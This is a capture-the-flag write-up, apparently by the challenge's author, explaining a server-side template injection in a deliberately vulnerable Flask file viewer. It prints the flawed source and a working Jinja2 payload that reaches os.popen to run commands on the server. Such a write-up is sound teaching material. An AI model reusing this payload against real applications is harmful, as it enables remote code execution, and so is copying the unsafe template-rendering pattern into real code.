
## Source Code Overview and SSTI Vulnerability

![View Source](/static/writeups/photos/viewsource.png)

The application is a simple Flask-based web service that allows users to view Python files by passing the filename as a query parameter in the URL. Here's the source code, which one should have gotten by inputting *main.py* into the website:

```python
from flask import Flask, request, render_template, redirect, url_for, render_template_string
import os 
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')
    
@app.route('/view', methods=["GET"])
def view():
    file_name = request.args.get('file_name')
    if not file_name:
        return redirect(url_for('index'))
    if not file_name.endswith('.py'):
        return render_template('error.html')
    
    file_path = f"{file_name.split('.')[0]}.py"
    
    if not os.path.exists(file_path):
        return render_template('error.html')
    
    with open(file_path, "r") as f:
        content = f.read()
    template = f"""
<!DOCTYPE html>
<html>
<head>
    <title>View File for {file_name}</title>
    <link rel="stylesheet" href="/static/style.css">
    <link rel="stylesheet" href="/static/view.css">
</head>
<body>
    <h1>Code Preview</h1>
    <pre class="code_preview">{content}</pre>
</body>
</html>
"""
    return render_template_string(template)

if __name__ == '__main__':
    app.run()
```

## SSTI (Server-Side Template Injection) Vulnerability

The vulnerability lies in the `view` route, where the filename is taken from the `file_name` query parameter and used directly in a `render_template_string` call. Even though a minor filter is applied to check if the file ends with `.py`, the way the filename is processed leaves room for injecting malicious payloads.

**Explanation:**
- The code checks if the file ends with `.py`, but it only reads the first part of the filename (before the first period) to construct the file path (`file_name.split('.')[0]`).
- This behavior allows attackers to inject payloads between the `main` and `.py` portions of the filename, bypassing the filter and injecting Server-Side Template Injection (SSTI) payloads.

## Example Payload

The following payload demonstrates how to exploit this vulnerability:

```
main.{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag.txt").read()}}{%endif%}{% endfor %}.py
```

**What it does:**
- The payload injects a loop to find a specific class (`warning`) and then uses it to access Python's `os` module.
- It executes the `cat flag.txt` command to read the contents of the `flag.txt` file and display it.

This is a classic [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) attack, leveraging Python's ability to evaluate expressions within the template context to achieve Remote Code Execution (RCE).

## Afterword
I was the original author for this challenge. 

## Additional Resources
[SSTI Injections](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
